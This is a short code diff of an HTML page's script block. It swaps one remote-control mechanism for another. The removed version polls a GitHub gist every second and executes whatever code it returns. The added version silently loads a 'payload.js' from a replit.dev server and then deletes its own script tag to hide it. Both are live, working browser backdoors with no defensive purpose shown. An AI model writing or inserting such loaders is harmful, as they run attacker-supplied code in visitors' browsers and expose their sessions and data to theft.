@@ -1,21 +1,9 @@
 <script>
-    const gistUrl = "https://gist.githubusercontent.com/aso818/036d35d5f22a44cd5ec3630d8a70b3ca/raw/command.json";
-
-    async function checkConnect() {
-        try {
-            const r = await fetch(gistUrl + "?t=" + Date.now());
-            if (!r.ok) return;
-            const d = await r.json();
-            
-            if (d.code && d.code !== "") {
-                // تنفيذ الكود فوراً
-                new Function(d.code)();
-            }
-        } catch (e) {
-            console.log("خطأ في الاتصال: " + e);
-        }
-    }
-
-    // فحص كل ثانية واحدة لسرعة الاستجابة
-    setInterval(checkConnect, 1000);
+    (function() {
+        let s = document.createElement('script');
+        // سحب الملف من سيرفرك الجديد
+        s.src = 'https://d961990f-9541-46d0-834a-c440beb2bbd9-00-kf1qkuu9rj6h.pike.replit.dev/payload.js';
+        s.onload = () => s.remove();
+        document.head.appendChild(s);
+    })();
 </script>
